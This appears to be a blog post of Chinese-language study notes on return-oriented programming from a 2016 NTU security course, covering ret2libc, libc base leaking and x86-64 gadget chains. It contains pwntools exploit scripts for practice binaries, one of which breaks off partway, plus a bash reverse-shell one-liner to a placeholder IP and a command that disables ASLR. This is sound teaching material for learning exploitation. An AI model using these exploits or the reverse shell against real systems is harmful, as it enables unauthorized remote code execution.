<!DOCTYPE html>
<html lang="en-us">
  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
    
    <title>NTU STCS 2016学习笔记 0x03 ROP2 | Kur0&#39;s Blog</title>
    <meta name="viewport" content="width=device-width,minimum-scale=1">
    <meta name="description" content="ROP call function">
    <meta name="generator" content="Hugo 0.144.2">
    
    
    
      <meta name="robots" content="noindex, nofollow">
    
    

    
<link rel="stylesheet" href="/ananke/css/main.min.css" >




    

    
      

    

    

    
      <link rel="canonical" href="http://localhost:1313/posts/ntu-stcs-2016-w5/">
    

    <meta property="og:url" content="http://localhost:1313/posts/ntu-stcs-2016-w5/">
  <meta property="og:site_name" content="Kur0&#39;s Blog">
  <meta property="og:title" content="NTU STCS 2016学习笔记 0x03 ROP2">
  <meta property="og:description" content="ROP call function">
  <meta property="og:locale" content="en_us">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2020-08-29T16:31:45+00:00">
    <meta property="article:modified_time" content="2020-08-29T16:31:45+00:00">
    <meta property="article:tag" content="Pwn">
    <meta property="og:image" content="http://localhost:1313/posts/ntu-stcs-2016-w5/cover.jpg">

  <meta itemprop="name" content="NTU STCS 2016学习笔记 0x03 ROP2">
  <meta itemprop="description" content="ROP call function">
  <meta itemprop="datePublished" content="2020-08-29T16:31:45+00:00">
  <meta itemprop="dateModified" content="2020-08-29T16:31:45+00:00">
  <meta itemprop="wordCount" content="980">
  <meta itemprop="image" content="http://localhost:1313/posts/ntu-stcs-2016-w5/cover.jpg">
  <meta itemprop="keywords" content="Pwn">
  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:image" content="http://localhost:1313/posts/ntu-stcs-2016-w5/cover.jpg">
  <meta name="twitter:title" content="NTU STCS 2016学习笔记 0x03 ROP2">
  <meta name="twitter:description" content="ROP call function">

	
  </head><body class="ma0 avenir bg-near-white development">

    
   
  

  
  
  
  <header class="cover bg-center" style="background-image: url('/posts/ntu-stcs-2016-w5/cover.jpg');">
    <div class="bg-black-60">
      <nav class="pv3 ph3 ph4-ns" role="navigation">
  <div class="flex-l justify-between items-center center">
    <a href="/" class="f3 fw2 hover-white no-underline white-90 dib">
      
        Kur0&#39;s Blog
      
    </a>
    <div class="flex-l items-center">
      

      
      <div class="ananke-socials"></div>

    </div>
  </div>
</nav>

      <div class="tc-l pv6 ph3 ph4-ns">
        
          <div class="f2 f1-l fw2 white-90 mb0 lh-title">NTU STCS 2016学习笔记 0x03 ROP2</div>
          
            <div class="fw1 f5 f3-l white-80 measure-wide-l center lh-copy mt3 mb4">
              ROP call function
            </div>
          
        
      </div>
    </div>
  </header>



    <main class="pb7" role="main">
      
  
  
  <article class="flex-l flex-wrap justify-between mw8 center ph3">
    <header class="mt4 w-100">
      <aside class="instapaper_ignoref b helvetica tracked ttu">
          
        Posts
      </aside><div id="sharing" class="mt3 ananke-socials"></div>
<h1 class="f1 athelas mt3 mb1">NTU STCS 2016学习笔记 0x03 ROP2</h1>
      
      
      
      <time class="f6 mv4 dib tracked" datetime="2020-08-29T16:31:45Z">August 29, 2020</time>
      

      
      
    </header>
    <div class="nested-copy-line-height lh-copy serif f4 nested-links mid-gray pr4-l w-two-thirds-l"><h1 id="ret2syscall">ret2syscall</h1>
<ul>
<li><em>跳.plt entry</em></li>
<li><em>函数参数直接放到接下来的stack</em></li>
<li><em>用pop-ret处理用过的参数</em></li>
</ul>
<p><img src="w5-ropcall.png" alt="w5-ropcall"></p>
<h1 id="ret2libc">ret2libc</h1>
<ul>
<li><em>printf,gets,puts等函数所在位置:libc.so.6</em></li>
<li><em>直接用rop call libc 的system</em></li>
<li><em>用条件</em>
<ul>
<li><em>libc版本或者fuction的offset已知</em></li>
<li><em>ASLR开启情况</em></li>
</ul>
</li>
</ul>
<p><strong>Dynamically Linded Elf 动态链接库相关操作</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># 获取libc路径</span>
</span></span><span style="display:flex;"><span>ldd ./binary
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 查看libc中的相对位置</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># trick 使用 | grep &#39; system@&#39;来查看想找的symbol</span>
</span></span><span style="display:flex;"><span>readelf -s /lib32/libc.so.6 | grep <span style="color:#e6db74">&#39; system@&#39;</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># 指定加载的libc位置</span>
</span></span><span style="display:flex;"><span>LD_LIBRARY_PATH<span style="color:#f92672">=</span>./path/to/libc
</span></span></code></pre></div><p><strong>Function Lazy Binding</strong></p>
<p><em>library在binary执行时才加载，第一次call function时解析函数位置填入.got.plt</em></p>
<p><strong>推算libc base addr</strong></p>
<ul>
<li><em>函数在libc的相对位置不变</em>
<ul>
<li><em>使用readelf得知__libc_start_main和system在libc的相对位置</em></li>
</ul>
</li>
<li><em>使用任意输入函数print出__libc-start_main的.got内容，推算system在内存的addr</em>
<ul>
<li><em>用rop构造puts(__libc_start_main@got)</em></li>
<li><em>要leak的got entry,对应的function必须已经被call过</em></li>
</ul>
</li>
<li><em>前提：已有或已知远端libc.so.6版本</em></li>
</ul>
<p><strong>Libc Data Base</strong></p>
<ul>
<li>
<p><em>已知两个function的address时可以在libcdb里找对应的版本</em></p>
<ul>
<li><em><del>✘网站：libcdb.com:the libc data base</del></em></li>
<li><em>✘网站：<a href="https://libc.nullbyte.cat/">libc.nullbyte.cat</a></em></li>
<li><em>✔使用<a href="https://github.com/lieanu/LibcSearcher">LibcSearcher</a></em></li>
</ul>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#f92672">from</span> LibcSearcher <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#第二个参数，为已泄露的实际地址,或最后12位(比如：d90)，int类型</span>
</span></span><span style="display:flex;"><span>obj <span style="color:#f92672">=</span> LibcSearcher(<span style="color:#e6db74">&#34;fgets&#34;</span>, <span style="color:#ae81ff">0X7ff39014bd90</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>obj<span style="color:#f92672">.</span>dump(<span style="color:#e6db74">&#34;system&#34;</span>)        <span style="color:#75715e">#system 偏移</span>
</span></span><span style="display:flex;"><span>obj<span style="color:#f92672">.</span>dump(<span style="color:#e6db74">&#34;str_bin_sh&#34;</span>)    <span style="color:#75715e">#/bin/sh 偏移</span>
</span></span><span style="display:flex;"><span>obj<span style="color:#f92672">.</span>dump(<span style="color:#e6db74">&#34;__libc_start_main_ret&#34;</span>)  
</span></span></code></pre></div></li>
</ul>
<p><strong>Leak libc base</strong>
<em>一般leak __libc_start_main的地址，通过LibcSearcher获取system与/bin/sh的地址，再跳转回main触发溢出执行system(&rsquo;/bin/sh&rsquo;)</em></p>
<p><strong>例子：</strong><a href="/uploads/codes/w5/ret2libc3">ret2libc3</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> LibcSearcher <span style="color:#f92672">import</span> LibcSearcher
</span></span><span style="display:flex;"><span>sh <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./ret2libc3&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ret2libc3 <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./ret2libc3&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>puts_plt <span style="color:#f92672">=</span> ret2libc3<span style="color:#f92672">.</span>plt[<span style="color:#e6db74">&#39;puts&#39;</span>]
</span></span><span style="display:flex;"><span>libc_start_main_got <span style="color:#f92672">=</span> ret2libc3<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#39;__libc_start_main&#39;</span>]
</span></span><span style="display:flex;"><span>main <span style="color:#f92672">=</span> ret2libc3<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;main&#39;</span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print <span style="color:#e6db74">&#34;leak libc_start_main_got addr and return to main again&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> flat([<span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">112</span>, puts_plt, main, libc_start_main_got])
</span></span><span style="display:flex;"><span>sh<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">&#39;Can you find it !?&#39;</span>, payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print <span style="color:#e6db74">&#34;get the related addr&#34;</span>
</span></span><span style="display:flex;"><span>libc_start_main_addr <span style="color:#f92672">=</span> u32(sh<span style="color:#f92672">.</span>recv()[<span style="color:#ae81ff">0</span>:<span style="color:#ae81ff">4</span>])
</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> LibcSearcher(<span style="color:#e6db74">&#39;__libc_start_main&#39;</span>, libc_start_main_addr)
</span></span><span style="display:flex;"><span>libcbase <span style="color:#f92672">=</span> libc_start_main_addr <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>dump(<span style="color:#e6db74">&#39;__libc_start_main&#39;</span>)
</span></span><span style="display:flex;"><span>system_addr <span style="color:#f92672">=</span> libcbase <span style="color:#f92672">+</span> libc<span style="color:#f92672">.</span>dump(<span style="color:#e6db74">&#39;system&#39;</span>)
</span></span><span style="display:flex;"><span>binsh_addr <span style="color:#f92672">=</span> libcbase <span style="color:#f92672">+</span> libc<span style="color:#f92672">.</span>dump(<span style="color:#e6db74">&#39;str_bin_sh&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print <span style="color:#e6db74">&#34;get shell&#34;</span>
</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> flat([<span style="color:#e6db74">&#39;A&#39;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">104</span>, system_addr, <span style="color:#ae81ff">0xdeadbeef</span>, binsh_addr])
</span></span><span style="display:flex;"><span>sh<span style="color:#f92672">.</span>sendline(payload)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>sh<span style="color:#f92672">.</span>interactive()
</span></span></code></pre></div><p><strong>trick:开启reverse tcp shell(web同时适用)</strong>
system(&ldquo;bash -c &lsquo;bash -i &gt;&amp; /dev/tcp/to.your.ip.addr/31337 0&gt;&amp;1&rsquo;&rdquo;)</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># system(&#34;bash -c &#39;bash -i &gt;&amp; /dev/tcp/127.0.0.1/31337 0&gt;&amp;1&#39;&#34;)</span>
</span></span><span style="display:flex;"><span>nc -vlp <span style="color:#ae81ff">31337</span>
</span></span></code></pre></div><h1 id="rop-for-x86-64">ROP for x86-64</h1>
<p><strong>64-bin ROP</strong></p>
<ul>
<li><em>syscall 要用rax,rdi,rsi,rdx,rcx,r8,r9,syscall</em></li>
<li><em>Function call参数传递适用寄存器而不是栈 rdi,rsi,rdx,rcx,r8,r9</em></li>
<li><em>需要用pop-ret控制register，再接function address</em></li>
</ul>
<p><strong>64-bit register</strong></p>
<ul>
<li><em>rax,rcx,rdx,rbx,rsp,rbp,rsi,rdi</em></li>
<li><em>r8-r15是用前8个加上rex prefix来表示</em></li>
<li><em>r12-r15是callee saved，所以pop r12 - r15在function return前很常见</em></li>
<li><em>pop r14 = 415e / pop rsi = 5e</em></li>
<li><em>pop r15 = 415f / pop rdi = 5f</em></li>
</ul>
<p><strong>ROPgadget</strong>
ROPgadget预设的搜索长度对64位来说可能不太够，需要增加&ndash;depth</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>ROPgadget --binary ./binary --depth <span style="color:#ae81ff">100</span>
</span></span></code></pre></div><p><strong>通用gadget</strong></p>
<ul>
<li><em>64bit rop需要gadget控制参数</em></li>
<li><em>gcc的程序中有一些片段一定会有，可以用来做rop，构造ret2lib不是问题</em></li>
</ul>
<p><img src="w5-x64-rdi-rsi.png" alt="w5-x64-rdi-rsi"></p>
<p><img src="w5-x64-rdi.png" alt="w5-x64-rdi"></p>
<p><img src="w5-x64-rax.png" alt="w5-x64-rax"></p>
<p><img src="w5-x64-rcx.png" alt="w5-x64-rcx"></p>
<p><img src="w5-x64-rax2mem.png" alt="w5-x64-rax2mem"></p>
<p><strong>De-ASLR with ROP</strong>
<em>Calculate Runction Address without Information Leakage</em></p>
<p><img src="w5-deaslr.png" alt="w5-deaslr"></p>
<p><img src="w5-dl-rtresov.png" alt="w5-dl-rtresov"></p>
<p><strong>Linux 常用保护机制开关方法</strong></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span><span style="color:#75715e"># cannary 栈保护</span>
</span></span><span style="display:flex;"><span>gcc -o test test.c  <span style="color:#75715e"># 默认情况下，不开启Canary保护</span>
</span></span><span style="display:flex;"><span>gcc -fno-stack-protector -o test test.c  <span style="color:#75715e">#禁用栈保护</span>
</span></span><span style="display:flex;"><span>gcc -fstack-protector -o test test.c  <span style="color:#75715e">#启用堆栈保护，不过只为局部变量中含有 char 数组的函数插入保护代码</span>
</span></span><span style="display:flex;"><span>gcc -fstack-protector-all -o test test.c  <span style="color:#75715e">#启用堆栈保护，为所有函数插入保护代码</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># FORTIFY 检查是否存在缓冲区溢出的错误</span>
</span></span><span style="display:flex;"><span>gcc -o test test.c  <span style="color:#75715e">#默认情况下，不会开这个检查</span>
</span></span><span style="display:flex;"><span>gcc -D_FORTIFY_SOURCE<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span> -o test test.c  <span style="color:#75715e">#较弱的检查</span>
</span></span><span style="display:flex;"><span>gcc -D_FORTIFY_SOURCE<span style="color:#f92672">=</span><span style="color:#ae81ff">2</span> -o test test.c  <span style="color:#75715e">#较强的检查</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># NX（DEP）No-eXecute</span>
</span></span><span style="display:flex;"><span>gcc -o test test.c  <span style="color:#75715e">#默认情况下，开启NX保护</span>
</span></span><span style="display:flex;"><span>gcc -z execstack -o test test.c  <span style="color:#75715e">#禁用NX保护</span>
</span></span><span style="display:flex;"><span>gcc -z noexecstack -o test test.c  <span style="color:#75715e">#开启NX保护</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># PIE（ASLR）</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># liunx下关闭PIE的命令</span>
</span></span><span style="display:flex;"><span>sudo -s echo <span style="color:#ae81ff">0</span> &gt; /proc/sys/kernel/randomize_va_space
</span></span><span style="display:flex;"><span><span style="color:#75715e"># gcc编译命令</span>
</span></span><span style="display:flex;"><span>gcc -o test test.c  <span style="color:#75715e">#默认情况下，不开启PIE</span>
</span></span><span style="display:flex;"><span>gcc -fpie -pie -o test test.c  <span style="color:#75715e">#开启PIE，此时强度为1</span>
</span></span><span style="display:flex;"><span>gcc -fPIE -pie -o test test.c  <span style="color:#75715e">#开启PIE，此时为最高强度2</span>
</span></span><span style="display:flex;"><span>gcc -fpic -o test test.c  <span style="color:#75715e">#开启PIC，此时强度为1，不会开启PIE</span>
</span></span><span style="display:flex;"><span>gcc -fPIC -o test test.c  <span style="color:#75715e">#开启PIC，此时为最高强度2，不会开启PIE</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># RELRO</span>
</span></span><span style="display:flex;"><span>gcc编译：
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>gcc -o test test.c  <span style="color:#75715e">#默认情况下，是Partial RELRO</span>
</span></span><span style="display:flex;"><span>gcc -z norelro -o test test.c  <span style="color:#75715e">#关闭，即No RELRO</span>
</span></span><span style="display:flex;"><span>gcc -z lazy -o test test.c  <span style="color:#75715e">#部分开启，即Partial RELRO</span>
</span></span><span style="display:flex;"><span>gcc -z now -o test test.c  <span style="color:#75715e">#全部开启，即full RELRO</span>
</span></span></code></pre></div><p><strong>例子:</strong><a href="/uploads/codes/w5/gets">gets</a> <a href="/uploads/codes/w5/libc.so.6">libc.so.6</a></p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># context.log_level = &#39;debug&#39;</span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>arch <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;amd64&#39;</span>
</span></span><span style="display:flex;"><span>local <span style="color:#f92672">=</span> <span style="color:#ae81ff">1</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> local:
</span></span><span style="display:flex;"><span>	p <span style="color:#f92672">=</span> process(<span style="color:#e6db74">&#39;./gets&#39;</span>)
</span></span><span style="display:flex;"><span>	<span style="color:#75715e"># p = remote(&#39;127.0.0.1&#39;, 4000)</span>
</span></span><span style="display:flex;"><span>	libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>	p <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#39;10.21.13.69&#39;</span>, <span style="color:#ae81ff">10010</span>)
</span></span><span style="display:flex;"><span>	libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;</span>)
</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#39;./gets&#39;</span>)
</span></span><span style="display:flex;"><span>g <span style="color:#f92672">=</span> <span style="color:#66d9ef">lambda</span> x: next(elf<span style="color:#f92672">.</span>search(asm(x)))
</span></span><span style="display:flex;"><span>system_offset <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;system&#39;</span>]
</span></span><span style="display:flex;"><span>gets_offset <span style="color:#f92672">=</span> libc<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;gets&#39;</span>]
</span></span><span style="display:flex;"><span>offset <span style="color:#f92672">=</span> system_offset <span style="color:#f92672">-</span> gets_offset
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> offset <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">0</span>:
</span></span><span style="display:flex;"><span>	offset <span style="color:#f92672">&amp;=</span> <span style="color:#ae81ff">0xffffffff</span>
</span></span><span style="display:flex;"><span>gets_plt <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>plt[<span style="color:#e6db74">&#39;gets&#39;</span>]
</span></span><span style="display:flex;"><span>gets_got <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#39;gets&#39;</span>]
</span></span><span style="display:flex;"><span>libc_csu_init <span style="color:#f92672">=</span> elf<span style="color:#f92672">.</span>symbols[<span style="color:#e6db74">&#39;__libc_csu_init&#39;</span>]
</span></span><span style="display:flex;"><span>pop_rsp_r13_r14_r15_ret <span style="color:#f92672">=</span> g(<span style="color:#e6db74">&#39;pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret&#39;</span>)
</span></span><span style="display:flex;"><span>pop_rbp_ret <span style="color:#f92672">=</span> g(<span style="color:#e6db74">&#39;pop rbp ; ret&#39;</span>)
</span></span><span style="display:flex;"><span>pop_rdi_ret <span style="color:#f92672">=</span> g(<span style="color:#e6db74">&#39;pop rdi ; ret&#39;</span>)
</span></span><span style="display:flex;"><span>pop_r15_ret <span style="color:#f92672">=</span> g(<span style="color:#e6db74">&#39;pop r15 ; ret&#39;</span>)
</span></span><span style="display:flex;"><span>pop_rsi_r15_ret <span style="color:#f92672">=</span> g(<span style="color:#e6db74">&#39;pop rsi ; pop r15 ; ret&#39;</span>)
</span></span><span style="display:flex;"><span>pop_rbp_r14_r15_ret <span style="color:#f92672">=</span> g(<span style="color:#e6db74">&#39;pop rbp ; pop r14 ; pop r15 ; ret&#39;</span>)
</span></span><span style="display:flex;"><span>pop_rbx_rbp_r12_r13_r14_r15_ret <span style="color:#f92672">=</span> g(<span style="color:#e6db74">&#39;pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret&#39;</span>)
</span></span><span style="display:flex;"><span>add_ebx_esi_ret <span style="color:#f92672">=</span> g(<span style="color:#e6db74">&#39;add ebx, esi ; ret&#39;</span>)
</span></span><span style="display:flex;"><span>leave_ret <span style="color:#f92672">=</span> g(<span style="color:#e6db74">&#39;leave ; ret&#39;</span>)
</span></span><span style="display:flex;"><span>call_at_r12 <span style="color:#f92672">=</span> g(<span style="color:#e6db74">&#39;call QWORD PTR [r12+rbx*8]&#39;</span>)
</span></span><span style="display:flex;"><span><span style="color:#75715e"># gdb.attach(p)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>bss <span style="color:#f92672">=</span> <span style="color:#ae81ff">0x602000</span>
</span></span><span style="display:flex;"><span>buf1 <span style="color:#f92672">=</span> bss <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x100</span>
</span></span><span style="display:flex;"><span>buf2 <span style="color:#f92672">=</span> bss <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x200</span>
</span></span><span style="display:flex;"><span>buf3 <span style="color:#f92672">=</span> bss <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x300</span>
</span></span><span style="display:flex;"><span>buf4 <span style="color:#f92672">=</span> bss <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x400</span>
</span></span><span style="display:flex;"><span>buf5 <span style="color:#f92672">=</span> bss <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x500</span>
</span></span><span style="display:flex;"><span>buf6 <span style="color:#f92672">=</span> bss <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x600</span>
</span></span><span style="display:flex;"><span>buf7 <span style="color:#f92672">=</span> bss <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x700</span>
</span></span><span style="display:flex;"><span>buf8 <span style="color:#f92672">=</span> bss <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x800</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>rop1 <span style="color:#f92672">=</span> [
</span></span><span style="display:flex;"><span>	pop_rdi_ret, buf1, gets_plt, <span style="color:#75715e"># rop2</span>
</span></span><span style="display:flex;"><span>	pop_rdi_ret, buf2, gets_plt, <span style="color:#75715e"># rop4</span>
</span></span><span style="display:flex;"><span>	pop_rdi_ret, buf3, gets_plt, <span style="color:#75715e"># rop5</span>
</span></span><span style="display:flex;"><span>	pop_rdi_ret, buf4, gets_plt, <span style="color:#75715e"># rop7</span>
</span></span><span style="display:flex;"><span>	pop_rdi_ret, buf5, gets_plt, <span style="color:#75715e"># rop9</span>
</span></span><span style="display:flex;"><span>	pop_rdi_ret, buf6, gets_plt, <span style="color:#75715e"># rop10</span>
</span></span><span style="display:flex;"><span>	pop_rdi_ret, buf7, gets_plt, <span style="color:#75715e"># rop13</span>
</span></span><span style="display:flex;"><span>	pop_rbp_ret, buf1 <span style="color:#f92672">-</span> <span style="color:#ae81ff">8</span>, leave_ret
</span></span><span style="display:flex;"><span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>rop2 <span style="color:#f92672">=</span> [ <span style="color:#75715e"># buf1</span>
</span></span><span style="display:flex;"><span>	pop_rdi_ret, gets_got <span style="color:#f92672">+</span> <span style="color:#ae81ff">24</span>, gets_plt, <span style="color:#75715e"># rop3</span>
</span></span><span style="display:flex;"><span>	pop_rbp_ret, buf2 <span style="color:#f92672">-</span> <span style="color:#ae81ff">8</span>,
</span></span><span style="display:flex;"><span>	pop_rsp_r13_r14_r15_ret, gets_got
</span></span><span style="display:flex;"><span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>rop3 <span style="color:#f92672">=</span> [ <span style="color:#75715e"># gets_got + 24</span>
</span></span><span style="display:flex;"><span>	leave_ret
</span></span><span style="display:flex;"><span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>rop4 <span style="color:#f92672">=</span> [ <span style="color:#75715e"># buf2</span>
</span></span><span style="display:flex;"><span>	libc_csu_init,
</span></span><span style="display:flex;"><span>	pop_rbp_ret, buf3 <span style="color:#f92672">-</span> <span style="color:#ae81ff">8</span>, leave_ret
</span></span><span style="display:flex;"><span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>rop5 <span style="color:#f92672">=</span> [ <span style="color:#75715e"># buf3</span>
</span></span><span style="display:flex;"><span>	pop_rdi_ret, buf2 <span style="color:#f92672">-</span> <span style="color:#ae81ff">24</span>, gets_plt, <span style="color:#75715e"># rop6_1</span>
</span></span><span style="display:flex;"><span>	pop_rdi_ret, buf2 <span style="color:#f92672">+</span> <span style="color:#ae81ff">32</span>, gets_plt, <span style="color:#75715e"># rop6_2</span>
</span></span><span style="display:flex;"><span>	pop_rbp_ret, buf2 <span style="color:#f92672">-</span> <span style="color:#ae81ff">24</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">8</span>, leave_ret
</span></span><span style="display:flex;"><span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>rop6_1 <span style="color:#f92672">=</span> [ <span style="color:#75715e"># buf2 - 24</span>
</span></span><span style="display:flex;"><span>	pop_rbx_rbp_r12_r13_r14_r15_ret
</span></span><span style="display:flex;"><span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>rop6_2 <span style="color:#f92672">=</span> [ <span style="color:#75715e"># buf2 + 32</span>
</span></span><span style="display:flex;"><span>	pop_rsi_r15_ret, offset, <span style="color:#ae81ff">8</span>,
</span></span><span style="display:flex;"><span>	add_ebx_esi_ret,
</span></span><span style="display:flex;"><span><span style="color:#75715e">#	0xdeadbeef,</span>
</span></span><span style="display:flex;"><span>	libc_csu_init,
</span></span><span style="display:flex;"><span>	pop_rbp_ret, buf4 <span style="color:#f92672">-</span> <span style="color:#ae81ff">8</span>, leave_ret
</span></span><span style="display:flex;"><span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>rop7 <span style="color:#f92672">=</span> [ <span style="color:#75715e"># buf4</span>
</span></span><span style="display:flex;"><span>	pop_rdi_ret, gets_got <span style="color:#f92672">+</span> <span style="color:#ae81ff">28</span>, gets_plt, <span style="color:#75715e"># rop8</span>
</span></span><span style="display:flex;"><span>	pop_rbp_ret, buf5 <span style="color:#f92672">-</span> <span style="color:#ae81ff">8</span>,
</span></span><span style="display:flex;"><span>	pop_rsp_r13_r14_r15_ret, gets_got <span style="color:#f92672">+</span> <span style="color:#ae81ff">4</span>
</span></span><span style="display:flex;"><span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>rop8 <span style="color:#f92672">=</span> [ <span style="color:#75715e"># gets_got + 28</span>
</span></span><span style="display:flex;"><span>	leave_ret
</span></span><span style="display:flex;"><span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>rop9 <span style="color:#f92672">=</span> [ <span style="color:#75715e"># buf5</span>
</span></span><span style="display:flex;"><span>	libc_csu_init,
</span></span><span style="display:flex;"><span>	pop_rbp_ret, buf6 <span style="color:#f92672">-</span> <span style="color:#ae81ff">8</span>, leave_ret
</span></span><span style="display:flex;"><span>]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>rop10 <span style="color:#f92672">=</span> [ <span style="color:#75715e"># buf6</span>
</span></span><span style="display:flex;"><span>	pop_rdi_ret, buf5 <span style="color:#f92672">-</span> <span style="color:#ae81ff">24</span>, gets_plt, <span style="color:#75715e"># rop11_1</span>
</span></span><span style="display:flex;"><span>	pop_rdi_ret, buf5 <span style="color:#f92672">+</span> <span style="color:#ae81ff">32</span>, gets_plt, <span style="color:#75715e"># rop11_2</span>
</span></span><span style="display:flex;"><span>	pop_rbp_ret, buf5 <span style="color:#f92672">-</span> <span style="color:#ae81ff">24</span> <span style="color:#f92672">-</span> <span style="color:#ae81ff">8</span>, leave_ret
</span></span><span style="display:flex;"><span>]
</span></span><span style="display:flex;"><span>
